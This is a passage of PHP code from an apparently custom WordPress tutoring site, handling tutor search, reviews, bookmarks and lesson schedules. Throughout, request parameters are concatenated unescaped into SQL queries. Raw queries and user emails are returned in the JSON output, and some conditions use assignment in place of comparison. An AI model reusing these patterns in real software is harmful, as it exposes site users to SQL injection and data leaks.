    $where = 'ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $role_cond) . ')';

    if($description != ''){
        $desc_cond[] = 'meta_key = \'desc_tell_me\' AND meta_value LIKE \'%' . $description . '%\'';
        $desc_cond[] = 'meta_key = \'subject_description\' AND meta_value LIKE \'%' . $description . '%\'';
        $where .= ' AND ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $desc_cond) . ')';
    }

    if($type == 'fromclass'){
        if($subject_type != 0 || $subject_type != 'all'){
            $subject_arr = explode('|', $subject_type);
            if(isset($subject_arr[1]) && $subject_arr[1] != 'all'){
                $sub_cond = 'meta_key = \''.$subject_arr[0].'\' AND meta_value LIKE \'%' . $subject_arr[1] . '%\'';
                $where .= ' AND ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . $sub_cond . ')';
            }else{
                if(isset($subject_arr[0]) && $subject_arr[0] = 'english_subject')
                    $sub_arr = array('english_conversation','english_grammar','english_writting','english_reading_comprehension','others');
                else if(isset($subject_arr[0]) && $subject_arr[0] = 'math_subject')
                    $sub_arr = array('elemenatary_school_math','middle_school_math','high_school_math','advanced_math','others');
                else if(isset($subject_arr[0]) && $subject_arr[0] = 'science_subject')
                    $sub_arr = array('science_middle_school','physics_high_school','chemistry_high_school','others');
                else
                    $sub_arr = array();

                if(count($sub_arr) > 0){
                    foreach ($sub_arr as $sub) {
                        $sub_cond[] = 'meta_key = \''.$subject_arr[0].'\' AND meta_value LIKE \'%' . $sub . '%\'';
                    }
                    $where .= ' AND ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $sub_cond) . ')';
                }
            }
        }else{
            if($subject_type == 'all'){
                $sub_arr = array('english_conversation','english_grammar','english_writting','english_reading_comprehension','others');
                foreach ($sub_arr as $sub) {
                    $sub_cond[] = 'meta_key = \'english_subject\' AND meta_value LIKE \'%' . $sub . '%\'';
                }

                $sub_arr1 = array('elemenatary_school_math','middle_school_math','high_school_math','advanced_math','others');
                foreach ($sub_arr1 as $sub1) {
                    $sub_cond[] = 'meta_key = \'math_subject\' AND meta_value LIKE \'%' . $sub1 . '%\'';
                }

                $sub_arr2 = array('science_middle_school','physics_high_school','chemistry_high_school','others');
                foreach ($sub_arr2 as $sub2) {
                    $sub_cond[] = 'meta_key = \'science_subject\' AND meta_value LIKE \'%' . $sub2 . '%\'';
                }
                $where .= ' AND ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $sub_cond) . ')';
            }
        }
    }else{
       if($subject_type != ''){
            foreach ($subject_type as $sub) {
                $sub_cond[] = 'meta_key = \'subject_type\' AND meta_value LIKE \'%' . $sub . '%\'';
            }
            $where .= ' AND ID IN (SELECT user_id FROM ' . $wpdb->usermeta . ' WHERE ' . implode(' OR ', $sub_cond) . ')';
        } 
    }

    if(($type == 'available' || $available == 'available') ){
        $where .= ' AND ID IN (SELECT tutor_id FROM ' . $wpdb->prefix . 'dict_tutoring_available GROUP BY tutor_id)';
    }
    if( $type =='english'){
        $where .= ' AND ID IN (SELECT tutor_id FROM ' . $wpdb->prefix . 'dict_tutoring_available GROUP BY tutor_id)';
    }   
    if( $type =='math'){
        $where .= ' AND ID IN (SELECT tutor_id FROM ' . $wpdb->prefix . 'dict_tutoring_available GROUP BY tutor_id)';
    } 

    if($time != ''){
        $where .= ' AND ID IN (SELECT tutor_id FROM ' . $wpdb->prefix . 'dict_tutoring_available WHERE time_start = \''.$time.'\' GROUP BY tutor_id)';
    }

    if($date != ''){
        $where .= ' AND ID IN (SELECT tutor_id FROM ' . $wpdb->prefix . 'dict_tutoring_available WHERE date = \''.$date.'\' GROUP BY tutor_id)';
    }

    if($search != ''){
        $where .= ' AND (display_name LIKE \'%' . esc_sql($search) . '%\' OR user_login LIKE \'%' . esc_sql($search) . '%\' OR user_email LIKE \'%' . esc_sql($search) . '%\')';
    }

    $rquery = 'SELECT ID, user_email, display_name, user_registered FROM ' . $wpdb->users;
    $rquery .= ' WHERE '. $where;
    $rquery .= ' GROUP BY ID ORDER BY user_registered DESC';
    //echo $query;
    $users = $wpdb->get_results($rquery);
    $arr_user2 = $arr_user1 = $arr_user = $arr_user3 = $arr_user4 = array();
    $current_user = wp_get_current_user();
    if(count($users) > 0){
        $item = array();
        $subject_type_update = array();
        foreach ($users as $key => $value) {
            $profile_value = get_user_meta($value->ID, 'ik_user_avatar', true);
            $display_name = get_user_meta($value->ID, 'display_name', true);
            $first_name = get_user_meta($value->ID, 'first_name', true);
            $last_name = get_user_meta($value->ID, 'last_name', true);
            $desc_tell_me = get_user_meta($value->ID, 'desc_tell_me', true);            
            $teaching_link = get_user_meta($value->ID, 'teaching_link', true);
            $teaching_subject = get_user_meta($value->ID, 'teaching_subject', true);
            $student_link = get_user_meta($value->ID, 'student_link', true);
            $user_years = get_user_meta($value->ID, 'user_years', true);
            $school_attend = get_user_meta($value->ID, 'school_attend', true);
            $user_gpa = get_user_meta($value->ID, 'user_gpa', true);
            $user_grade = get_user_meta($value->ID, 'user_grade', true);
            $user_major = get_user_meta($value->ID, 'user_major', true);            
            $any_other = get_user_meta($value->ID, 'any_other', true);
            $previous_school = get_user_meta($value->ID, 'previous_school', true);
            $main_image = get_user_meta($value->ID, 'main_image',true);

            $school_name = get_user_meta($value->ID, 'school_name', true);
            $school_name_05 = get_user_meta($value->ID, 'school_name_05', true);
            $school_name_02 = get_user_meta($value->ID, 'school_name_02', true);
            $school_name_03 = get_user_meta($value->ID, 'school_name_03', true);
            $school_name_04 = get_user_meta($value->ID, 'school_name_04', true);
            $teaching_link = get_user_meta($value->ID, 'teaching_link', true);
            $teaching_subject = get_user_meta($value->ID, 'teaching_subject', true);
            $teaching_subject_02 = get_user_meta($value->ID, 'teaching_subject_02', true);
            $teaching_subject_03 = get_user_meta($value->ID, 'teaching_subject_03', true);
            $teaching_subject_04 = get_user_meta($value->ID, 'teaching_subject_04', true);
            $teaching_subject_05 = get_user_meta($value->ID, 'teaching_subject_05', true);
            $school_name1 = get_user_meta($value->ID, 'school_name1', true);
            $school_name2 = get_user_meta($value->ID, 'school_name2', true);
            $school_name3 = get_user_meta($value->ID, 'school_name3', true);
            $school_name4 = get_user_meta($value->ID, 'school_name4', true);
            $school_name5 = get_user_meta($value->ID, 'school_name5', true);
            $school_link1 = get_user_meta($value->ID, 'school_link1', true);
            $school_link2 = get_user_meta($value->ID, 'school_link2', true);            
            $school_link3 = get_user_meta($value->ID, 'school_link3', true);
            $school_link4 = get_user_meta($value->ID, 'school_link4', true);
            $school_link5 = get_user_meta($value->ID, 'school_link5', true);
            $taget_tutor = get_user_meta($value->ID, 'previous_school', true);

            if (!empty($profile_value))
                $user_avatar = $profile_value;
            else
                $user_avatar = get_template_directory_uri().'/library/images/icon_Tutor_ID.png';

            $english_subject = get_user_meta($value->ID, 'english_subject', true);
            $english_subject_desc = get_user_meta($value->ID, 'english_subject_desc', true);

            $math_subject = get_user_meta($value->ID, 'math_subject', true);
            $math_subject_desc = get_user_meta($value->ID, 'math_subject_desc', true);

            $science_subject = get_user_meta($value->ID, 'science_subject', true);
            $science_subject_desc = get_user_meta($value->ID, 'science_subject_desc', true);

            $description_preference = get_user_meta($value->ID, 'description_preference', true);
            $other_preference = get_user_meta($value->ID, 'other_preference', true);

            $price_tutoring = get_user_meta($value->ID, 'price_tutoring', true);
            $price_group_tutoring = get_user_meta($value->ID, 'price_group_tutoring', true);
            $price_tutoring = empty($price_tutoring)? 15 : $price_tutoring;

            $user_subject = '';
            $subject_type_update = array();
            if (!empty($english_subject) && $english_subject != '') {
                $subs_english = array(
                    'english_conversation' => 'English: Conversation for Foreign Students',
                    'english_grammar' => 'English: English Grammar',
                    'english_writting' => 'English: English Writting',            
                    'english_reading_comprehension' => 'English: English Reading Comprehension',
                    'others' => 'English: Others'
                );
                $subjects_english = explode(',', $english_subject);                
                if (count($subjects_english) > 0) {
                    $n = count($subjects_english) - 1;
                    for ($i = 0; $i < count($subjects_english); $i++) {
                        $key = $subjects_english[$i];
                        if($key == 'others'){
                            if($english_subject_desc != ''){
                                $subject_type_update[] = $subs_english[$key].' '.$english_subject_desc;
                            }else{
                                $subject_type_update[] = $subs_english[$key];
                            }
                        }else{
                            $subject_type_update[] = $subs_english[$key];
                        }
                        
                        if (count($subjects_english) > 1 && $i < $n)
                            $user_subject .= ', ';
                    }
                }
            }

            if (!empty($math_subject) && $math_subject != '') {
                $subs_math = array( 
                    'elemenatary_school_math' => 'Math: Elemenatary School Math',
                    'middle_school_math' => 'Math: Middle School Math',
                    'high_school_math' => 'Math: High School Math',
                    'advanced_math' => 'Math: Advanced Math',
                    'others' => 'Math: Others'
                );
                $subjects_math = explode(',', $math_subject);                
                if (count($subjects_math) > 0) {
                    $n = count($subjects_math) - 1;
                    for ($i = 0; $i < count($subjects_math); $i++) {
                        $key = $subjects_math[$i];
                        if($key == 'others'){
                            if($math_subject_desc != ''){
                                $subject_type_update[] = $subs_math[$key].' '.$math_subject_desc;
                            }else{
                                $subject_type_update[] = $subs_math[$key];
                            }
                        }else{
                            $subject_type_update[] = $subs_math[$key];
                        }
                        if (count($subjects_math) > 1 && $i < $n)
                            $user_subject .= ', ';
                    }
                }
            }

            if (!empty($science_subject) && $science_subject != '') {
                $subs_science = array( 
                    'science_middle_school' => 'Science: Science of Middle, Elementary School',
                    'physics_high_school' => 'Science: Physics for High School',
                    'chemistry_high_school' => 'Science: Chemistry for High School',
                    'others' => 'Science: Others'
                );
                $subjects_science = explode(',', $science_subject);                
                if (count($subjects_science) > 0) {
                    $n = count($subjects_science) - 1;
                    for ($i = 0; $i < count($subjects_science); $i++) {
                        $key = $subjects_science[$i];
                        if($key == 'others'){
                            if($science_subject_desc != ''){
                                $subject_type_update[] = $subs_science[$key].' '.$science_subject_desc;
                            }else{
                                $subject_type_update[] = $subs_science[$key];
                            }
                        }else{
                            $subject_type_update[] = $subs_science[$key];
                        }
                        if (count($subjects_science) > 1 && $i < $n)
                            $user_subject .= ', ';
                    }
                }
            }

            if($other_preference != ''){
                if($description_preference != ''){
                    $subject_type_update[] = 'Others '.$description_preference;
                }else{
                    $subject_type_update[] = 'Others';
                }
            }

            $user_subject = implode(', ', $subject_type_update);
            $user_subject = wp_trim_words($user_subject,12);

            $book_mark = get_user_meta($value->ID, 'book_mark', true);
            $favorite = 0;
            $arr_favorite = array();
            if (!empty($book_mark) && $book_mark != ''){
                $arr_favorite = explode(',', $book_mark);
                foreach ($arr_favorite as $key => $val) {
                    if($val == $current_user->ID){
                        $favorite = 1;
                    }
                }
            }

            $query = 'SELECT rv.* FROM ' . $wpdb->prefix . 'dict_tutor_review AS rv WHERE rv.review_id = '.$value->ID;
            $reviews = $wpdb->get_results($query);
            $star = 0;
            $cnt = count($reviews);
            $arr_review = array();
            if(count($reviews) > 0){
                $itemrv = array();
                foreach ($reviews as $key => $vr) {
                    $review_uname = get_user_by('id', $vr->userid);
                    $review_dname = get_user_meta($vr->userid, 'display_name', true);
                    $star += $vr->star;
                    $itemrv['id'] = $vr->id;
                    $itemrv['review_id'] = $vr->review_id;
                    $itemrv['star'] = $vr->star;
                    $itemrv['userid'] = $vr->userid;
                    $itemrv['subject'] = $vr->subject;
                    $itemrv['message'] = $vr->message;
                    if($review_dname)
                        $itemrv['review_name'] = $review_dname;
                    else
                        $itemrv['review_name'] = $review_uname->display_name;
                    $arr_review[] = $itemrv;
                }
            }
                 
            if($cnt == 0)
                $total_star = $star;
            else
                $total_star = ceil($star/$cnt);

            $query1 = 'SELECT id FROM ' . $wpdb->prefix . 'dict_groups WHERE created_by = '.$value->ID;
            $rows = $wpdb->get_results($query1);
            $fromclass = count($rows);
            //$cnt = $cnt + $fromclass + $favorite;

            if (!empty($display_name) && $display_name != '')
                $user_name = $display_name;
            else if((!empty($first_name) && $first_name != '') || (!empty($last_name) && $last_name != ''))
                $user_name = $first_name.' '.$last_name;
            else
                $user_name = $value->display_name;

            $item['ID'] = $value->ID;
            $item['query'] =  $rquery;
            $item['user_email'] = $value->user_email;
            $item['display_name'] = $user_name;
            $item['user_registered'] = $value->user_registered;
            $item['user_avatar'] = $user_avatar;
            $item['user_subject'] = $user_subject;
            $item['star'] = $total_star;
            $item['favorite'] = $favorite;
            $item['fromclass'] = $fromclass;
            $item['user_favorites'] = $arr_favorite;
            $item['cnt'] = $cnt;
            $item['reviews'] = $arr_review;
            $item['desc_tell_me'] =  $desc_tell_me;
            $item['subject_type'] =  $subject_type_update;
            $item['teaching_link'] =  $teaching_link;;
            $item['user_years'] =  $user_years;
            $item['school_attend'] =  $school_attend;
            $item['student_link'] =  $student_link;
            $item['user_gpa'] =  $user_gpa;
            $item['user_grade'] =  $user_grade;
            $item['user_major'] =  $user_major;
            $item['any_other'] =  $any_other;
            $item['subject_description'] =  $subject_description;
            $item['price_tutoring'] = $price_tutoring;
            $item['price_group_tutoring'] = $price_group_tutoring;
            $item['previous_school'] = $previous_school;            
            $item['school_name'] =  $school_name;
            $item['school_name_02'] =  $school_name_02;
            $item['school_name_03'] =  $school_name_03;
            $item['school_name_04'] =  $school_name_04;
            $item['school_name_05'] =  $school_name_05;           
            $item['teaching_subject'] =  $teaching_subject;
            $item['teaching_subject_02'] =  $teaching_subject_02;
            $item['teaching_subject_03'] =  $teaching_subject_03;
            $item['teaching_subject_04'] =  $teaching_subject_04;
            $item['teaching_subject_05'] =  $teaching_subject_05;
            $item['school_name1'] =  $school_name1;
            $item['school_name2'] =  $school_name2;
            $item['school_name3'] =  $school_name3;
            $item['school_name4'] =  $school_name4;
            $item['school_name5'] =  $school_name5;
            $item['school_link1'] =  $school_link1;
            $item['school_link2'] =  $school_link2;
            $item['school_link3'] =  $school_link3;
            $item['school_link4'] =  $school_link4;
            $item['school_link5'] =  $school_link5;
            $item['taget_tutor'] = $taget_tutor;
            $item['main_image'] = $main_image;
            $item['enable_one_tutoring'] = $value->enable_one_tutoring;
            $item['enable_group_tutoring'] = $value->enable_group_tutoring;
            if ($type == 'english-conv') {
                $b = 0;
                foreach ($subject_type_update as $valuex) {
                    $pos = substr($valuex,0,12);
                    if($pos == "English: Con"){
                        $b = 1;                        
                    }
                }
                if($b == 1){
                    $arr_user5[] = $item;
                }
            }
            if ($type == 'english-wri') {
                $b = 0;
                foreach ($subject_type_update as $valuex) {
                    $pos = substr($valuex,0,19);
                    if($pos == "English: English Wr"){
                        $b = 1;                        
                    }
                }
                if($b == 1){
                    $arr_user3[] = $item;
                }
            }
            if ($type == 'math') {
                $b = 0;
                foreach ($subject_type_update as $valuex) {
                    $pos = substr($valuex,0,3);
                    if($pos == "Mat"){
                        $b = 1;                        
                    }
                }
                if($b == 1){
                    $arr_user4[] = $item;
                }
            }

            if($type == 'favorite' && $favorite > 0){
                $arr_user1[] = $item;
            }else{
                if($type_search[0] == 'favorite' && $favorite > 0){
                    $arr_user2[] = $item;
                }else if($type_search[0] == 'rating' && $total_star > 0){
                    $arr_user2[] = $item;
                }else if(count($type_search) == 2 && ($favorite > 0 || $total_star > 0)){
                    $arr_user2[] = $item;
                }else{
                    $arr_user2[] = $arr_user[] = $item;
                }
            }
        }
    }
    //$arr_user = unique_multidim_array('ID',$arr_user);
    //$arr_user1 = unique_multidim_array('ID',$arr_user1);
    //$arr_user2 = unique_multidim_array('ID',$arr_user2);
    if($type == 'review'){
        array_multisort(
            array_column($arr_user, 'star'), SORT_NUMERIC, SORT_DESC,
            $arr_user
        );
        echo json_encode(array('users' => $arr_user));
    }else if($type == 'favorite'){
        array_multisort(
            array_column($arr_user1, 'favorite'), SORT_NUMERIC, SORT_DESC,
            $arr_user1
        );
        echo json_encode(array('users' => $arr_user1));
    }else if($type == 'fromclass'){
        array_multisort(
            array_column($arr_user2, 'fromclass'), SORT_NUMERIC, SORT_DESC,
            $arr_user2
        );
        echo json_encode(array('users' => $arr_user2));
    }else if($type == 'english-conv') {
        echo json_encode(array('users' => $arr_user5));
    }else if($type == 'math') {
        echo json_encode(array('users' => $arr_user4));
    }else if($type == 'english-wri'){
        echo json_encode(array('users' => $arr_user3));
    }else{
        echo json_encode(array('users' => $arr_user));
    }
    die;
}
if ($task == "get_users_reviews") {
    $tutor_id = $_REQUEST['tutor_id'];
    $query = 'SELECT rv.* FROM ' . $wpdb->prefix . 'dict_tutor_review AS rv WHERE rv.review_id = '.$tutor_id;
    $reviews = $wpdb->get_results($query);
    $star = 0;
    $cnt = count($reviews);
    $arr_review = array();
    if(count($reviews) > 0){
        $itemrv = array();
        foreach ($reviews as $key => $vr) {
            $review_uname = get_user_by('id', $vr->userid);
            $review_dname = get_user_meta($vr->userid, 'display_name', true);
            $star += $vr->star;
            $itemrv['id'] = $vr->id;
            $itemrv['review_id'] = $vr->review_id;
            $itemrv['star'] = $vr->star;
            $itemrv['userid'] = $vr->userid;
            $itemrv['subject'] = $vr->subject;
            $itemrv['message'] = $vr->message;
            if($review_dname)
                $itemrv['review_name'] = $review_dname;
            else
                $itemrv['review_name'] = $review_uname->display_name;
            $arr_review[] = $itemrv;
        }
    }
    
    array_multisort(
        array_column($arr_review, 'star'), SORT_NUMERIC, SORT_DESC,
        $arr_review
    );
    echo json_encode(array('reviews' => $arr_review));
    die;
}
if ($task == "save_review") {
    $review_id = $_REQUEST['review_id'];
    $userid = $_REQUEST['userid'];
    $subject = $_REQUEST['subject'];
    $message = $_REQUEST['message'];
    $star = $_REQUEST['star'];
    $current_user = wp_get_current_user();

    $query = "SELECT * FROM " . $wpdb->prefix . "dict_tutor_review WHERE review_id = '".$review_id."' AND userid = '".$current_user->ID."'";
    $row = $wpdb->get_row($query);
    if($row){
        $id = $row->id;
        $result = $wpdb->update(
                        $wpdb->prefix . 'dict_tutor_review', array(
                            'subject' => $subject,
                            'message' => $message,
                            'star' => $star
                        ), array('id' => $id)
                    );
    }else{
        $result = $wpdb->insert(
                        $wpdb->prefix . 'dict_tutor_review', array(
                            'review_id' => $review_id,
                            'userid' => $current_user->ID,
                            'subject' => $subject,
                            'message' => $message,
                            'star' => $star
                        )
                    );
    }
    echo 1;
    exit;
}
if ($task == "save_book_mark") {
    $userid = $_REQUEST['userid'];    
    $current_user = wp_get_current_user();
    $book_mark = get_user_meta($userid, 'book_mark', true);
    if (!empty($book_mark) && $book_mark != ''){
        $arr_favorite = explode(',', $book_mark);
        if(in_array($current_user->ID, $arr_favorite)){
            foreach ($arr_favorite as $key => $value) {
                if($value == $current_user->ID){
                    unset($arr_favorite[$key]);
                }
            }
            $favorites = implode(',', $arr_favorite);
            update_user_meta($userid, 'book_mark', $favorites);
            echo 0;
            exit;
        }else{
            $arr_favorite[] = $current_user->ID;
            $favorites = implode(',', $arr_favorite);
            update_user_meta($userid, 'book_mark', $favorites);
            echo 1;
            exit;
        }        
    }else{
        update_user_meta($userid, 'book_mark', $current_user->ID);
        echo 1;
        exit;
    }
}
if($task == 'get_tutoring_plan'){
    $user_id = get_current_user_id();
    $search = $_REQUEST["search"];
    if(trim($search) != ''){
        $where = ' WHERE tp.private_subject LIKE \'%'.$search.'%\' OR tp.subject LIKE \'%'.$search.'%\' OR tp.short_message LIKE \'%'.$search.'%\' ';
    }else{
        $where = ' ';
    }
    $query = 'SELECT tp.*, u.display_name AS student_name
            FROM ' . $wpdb->prefix . 'dict_tutoring_plan AS tp
            LEFT JOIN ' . $wpdb->users . ' AS u ON u.ID = tp.id_user
            '.$where.'ORDER BY tp.date DESC';
    $results = $wpdb->get_results($query);
    $arr = array();
    $time_zone = get_user_meta($user_id, 'user_timezone', true);
    $time_zone = empty($time_zone) ? 0 : $time_zone;
    $u_time_zone_index = get_user_meta($user_id, 'time_zone_index', true);
    $u_time_zone_index = empty($u_time_zone_index)? 0 : $u_time_zone_index;
    $time_zone_name = get_user_meta($user_id, 'time_zone_name', true);
    $timezone_name = empty($time_zone_name)? convert_timezone_to_name($u_time_zone_index):$time_zone_name;
    if(count($results) > 0){
        foreach ($results as $value) {
            $date_time = explode('~', $value->time);
            $start = substr(trim($date_time[0]),0,-3).' '.strtoupper(substr(trim($date_time[0]),-2));
            $end = substr(trim($date_time[1]),0,-3).' '.strtoupper(substr(trim($date_time[1]),-2));
            $timezone_scheduled = convert_timezone_to_name($value->time_zone_index);
            
            $original_datetime_st = $value->date.' '.$start;
            $original_timezone_st = new DateTimeZone($timezone_scheduled);
            $datetime_st = new DateTime($original_datetime_st, $original_timezone_st);
            $target_timezone_st = new DateTimeZone($timezone_name);
            $datetime_st->setTimeZone($target_timezone_st);
        
            $original_datetime_ed = $value->date.' '.$end;
            $original_timezone_ed = new DateTimeZone($timezone_scheduled);
            $datetime_ed = new DateTime($original_datetime_ed, $original_timezone_ed);
            $target_timezone_ed = new DateTimeZone($timezone_name);
            $datetime_ed->setTimeZone($target_timezone_ed);
            
            $original_datetime_ct = $value->created_on;
            $original_timezone_ct = new DateTimeZone($timezone_scheduled);
            $datetime_ct = new DateTime($original_datetime_ct, $original_timezone_ct);
            $target_timezone_ct = new DateTimeZone($timezone_name);
            $datetime_ct->setTimeZone($target_timezone_ct);
            
            $time = $datetime_st->format('h:ia').' - '.$datetime_ed->format('h:ia');
        
            $location = convert_timezone_to_location($value->time_zone_index);
            $arr[] = array(
                        'id' => $value->id,
                        'subject' => $value->subject,
                        'date' => $datetime_st->format('F d, Y'),
                        'date_schedule' => $datetime_st->format('Y-m-d'),
                        'time' => $datetime_st->format('h:i:a').' ~ '.$datetime_ed->format('h:i:a'),
                        'confirmed' => $value->confirmed,
                        'time_zone' => $value->time_zone,
                        'id_user' => $value->id_user,
                        'private_subject' => $value->private_subject,
                        'short_message' => $value->short_message,                        
                        'student_name' => $value->student_name,
                        'status'    => $value->status,
                        'time_start' => $datetime_st->format('Y-m-d / h:i a'),
                        'time_end' => $datetime_ed->format('Y-m-d / h:i a'),
                        'stime' => strtotime($datetime_st->format('Y-m-d H:i:s')),
                        'location' => $location,
                        'create_on' => $datetime_ct->format('M d, Y (h:i)'),
                        'created' => date('Y-m-d H:i:s', strtotime($value->created_on))
                    );
        }
    }
    if(count($arr) > 0){
        array_multisort(
            array_column($arr, 'stime'), SORT_NUMERIC, SORT_DESC,
            $arr
        );
    }
    echo json_encode(array('tutorings' => $arr));
    die;
}
if($task == 'get_scheduled_day'){
    $day = $_REQUEST["day"];
    if($day == '')
        $date = date('Y-m-d',time());
    else
        $date = $day;
    $user_id = get_current_user_id();
    $query = "SELECT tp.*, u.display_name AS student_name
            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
            LEFT JOIN " . $wpdb->users . " AS u ON u.ID = tp.id_user
            WHERE tp.id_user = ".$user_id." AND tp.status = 2 
            ORDER BY tp.date DESC"; //tp.date = '".$date."' AND 
    $results = $wpdb->get_results($query);
    $arr = array();
    //$pst = mw_get_option('price_schedule_tutoring');

    $user_points = get_user_meta($user_id, 'user_points', true);
    $user_points = empty($user_points) ? 0 : $user_points;
    $time_zone = get_user_meta($user_id, 'user_timezone', true);
    $time_zone = empty($time_zone) ? 0 : $time_zone;    
    $u_time_zone_index = get_user_meta($user_id, 'time_zone_index', true);
    $u_time_zone_index = empty($u_time_zone_index)? 0 : $u_time_zone_index;
    $time_zone_name = get_user_meta($user_id, 'time_zone_name', true);
    $timezone_name = empty($time_zone_name)? convert_timezone_to_name($u_time_zone_index):$time_zone_name; 

    $dt = new DateTime('now', new DateTimezone($timezone_name));
    
    if(count($results) > 0){
        foreach ($results as $value) {            
            //echo date('Y-m-d',$timezone).'-'.$date;
            $date_time = explode('~', $value->time);
            $start = substr(trim($date_time[0]),0,-3).' '.strtoupper(substr(trim($date_time[0]),-2));
            $end = substr(trim($date_time[1]),0,-3).' '.strtoupper(substr(trim($date_time[1]),-2));
            $timezone_scheduled = convert_timezone_to_name($value->time_zone_index);
            
            $original_datetime_st = $value->date.' '.$start;
            $original_timezone_st = new DateTimeZone($timezone_scheduled);
            $datetime_st = new DateTime($original_datetime_st, $original_timezone_st);
            $target_timezone_st = new DateTimeZone($timezone_name);
            $datetime_st->setTimeZone($target_timezone_st);
        
            $original_datetime_ed = $value->date.' '.$end;
            $original_timezone_ed = new DateTimeZone($timezone_scheduled);
            $datetime_ed = new DateTime($original_datetime_ed, $original_timezone_ed);
            $target_timezone_ed = new DateTimeZone($timezone_name);
            $datetime_ed->setTimeZone($target_timezone_ed);
            
            $original_datetime_ct = $value->created_on;
            $original_timezone_ct = new DateTimeZone($timezone_scheduled);
            $datetime_ct = new DateTime($original_datetime_ct, $original_timezone_ct);
            $target_timezone_ct = new DateTimeZone($timezone_name);
            $datetime_ct->setTimeZone($target_timezone_ct);
            
            $time = $datetime_st->format('h:ia').' - '.$datetime_ed->format('h:ia');
            $time2 = $datetime_st->format('h:i A').' - '.$datetime_ed->format('h:i A');
            
            $chour = (int)$dt->format('G');
            $cminute = (int)$dt->format('i');
            $uhour = (int)$datetime_ed->format('G');
            if($uhour == 0) $uhour = 12;
            $uminute = (int)$datetime_ed->format('i');

            $price_tutoring = get_user_meta($value->tutor_id, 'price_tutoring', true);
            $pst = empty($price_tutoring)? mw_get_option('price_schedule_tutoring') : $price_tutoring;
            
            if($datetime_st->format('Y-m-d') == $date){

                $user = get_user_by('id', $value->tutor_id);
                
                if($user){
                    $tutor_name = $user->display_name;
                }else{
                    $tutor_name = '';
                }
                
                if($datetime_st->format('G') == '0')
                    $start_id = '12_'.$datetime_st->format('i_a');
                else
                    $start_id = $datetime_st->format('G_i_a');
                    
                if($datetime_ed->format('G') == '0')
                    $end_id = '12_'.$datetime_ed->format('i_a');
                else
                    $end_id = $datetime_ed->format('G_i_a');
                
                if($day == ''){
                    if($value->confirmed == 0 && $value->canceled == 0 && ($value->accepted == 2 || (strtotime($datetime_st->format('Y-m-d')) < strtotime($dt->format('Y-m-d')) && $chour > $uhour || ($uhour == $chour && $cminute >= $uminute)))){
                        $canceled = 1;
                        $confirmed = 0;
                    }else{
                        if(strtotime($datetime_st->format('Y-m-d')) == strtotime($dt->format('Y-m-d')) && ($chour > $uhour || ($uhour == $chour && $cminute >= $uminute))){
                            $confirmed = 0;
                            $canceled  = 1;
                        }else{
                            $confirmed = $value->confirmed;
                            $canceled  = $value->canceled;
                        }
                    }
                }else{
                    if((strtotime($datetime_st->format('Y-m-d')) < strtotime($dt->format('Y-m-d')) && $value->confirmed == 0 && $value->canceled == 0 ) || $value->accepted == 2){
                        $confirmed = 0;
                        $canceled  = 1;
                    }else{
                        if(strtotime($datetime_st->format('Y-m-d')) == strtotime($dt->format('Y-m-d')) && ($chour > $uhour || ($uhour == $chour && $cminute >= $uminute))){
                            $confirmed = 0;
                            $canceled  = 1;
                        }else{
                            $confirmed = $value->confirmed;
                            $canceled  = $value->canceled;
                        }
                    }
                }
                                
                $total = $pst;//(int)$value->total_time*$pst/100;
                $location = convert_timezone_to_location($value->time_zone_index);
                $arr[] = array(
                            'id' => $value->id,
                            'subject' => $value->subject,
                            'date' => $datetime_st->format('F d, Y'),
                            'stuff' => $datetime_st->format('(l)'),
                            'time' => $datetime_st->format('h:i:a').' ~ '.$datetime_ed->format('h:i:a'),
                            'time_view' => $time,
                            'date_view' => $datetime_st->format('m/d/Y'),
                            'time_view2' => $time2,
                            'confirmed' => $confirmed,
                            'canceled' => $canceled,
                            'time_zone' => $value->time_zone,
                            'id_user' => $value->id_user,
                            'tutor_id' => $value->tutor_id,
                            'private_subject' => $value->private_subject,
                            'short_message' => $value->short_message,  
                            'note' => $value->note, 
                            'student_name' => $value->student_name,
                            'tutor_name' => $tutor_name,
                            'status'    => $value->status,
                            'accepted'  => $value->accepted,
                            'total' => $total,
                            'total_time' => $value->total_time,
                            'time_start' => $datetime_st->format('Y-m-d / h:i a'),
                            'time_end' => $datetime_ed->format('Y-m-d / h:i a'),
                            'stime' => strtotime($datetime_st->format('Y-m-d H:i:s')),
                            'location' => $location,
                            'start_id' => $start_id,
                            'end_id' => $end_id,
                            'create_on' => $datetime_ct->format('M d, Y (h:i)'),
                            'fromtime' => $datetime_st->format('h:i:a'),
                            'totime' => $datetime_ed->format(' h:i:a'),
                            'day' => $datetime_st->format('Y-m-d'),
                            'created' => date('Y-m-d H:i:s', strtotime($value->created_on))
                        );
            }
        }
    }

    if(count($arr) > 0){
        array_multisort(
            array_column($arr, 'stime'), SORT_NUMERIC, SORT_DESC,
            $arr
        );
    }

    $query2 = "SELECT tp.*, u.display_name AS student_name
            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
            LEFT JOIN " . $wpdb->users . " AS u ON u.ID = tp.id_user
            WHERE tp.status = 2 AND tp.id_user = ".$user_id."
            ORDER BY tp.date DESC";
    $results_cf = $wpdb->get_results($query2);
    $arr_confirmed = array();
    if(count($results_cf) > 0){
        foreach ($results_cf as $v) {
            $date_time2 = explode('~', $v->time);
            $start2 = substr(trim($date_time2[0]),0,-3).' '.strtoupper(substr(trim($date_time2[0]),-2));
            $end2 = substr(trim($date_time2[1]),0,-3).' '.strtoupper(substr(trim($date_time2[1]),-2));
            $timezone_scheduled2 = convert_timezone_to_name($v->time_zone_index);
            
            $original_datetime_st2 = $v->date.' '.$start2;
            $original_timezone_st2 = new DateTimeZone($timezone_scheduled2);
            $datetime_st2 = new DateTime($original_datetime_st2, $original_timezone_st2);
            $target_timezone_st2 = new DateTimeZone($timezone_name);
            $datetime_st2->setTimeZone($target_timezone_st2);
            
            $original_datetime_ed2 = $v->date.' '.$end2;
            $original_timezone_ed2 = new DateTimeZone($timezone_scheduled2);
            $datetime_ed2 = new DateTime($original_datetime_ed2, $original_timezone_ed2);
            $target_timezone_ed2 = new DateTimeZone($timezone_name);
            $datetime_ed2->setTimeZone($target_timezone_ed2);

            $original_datetime_ct2 = $v->created_on;
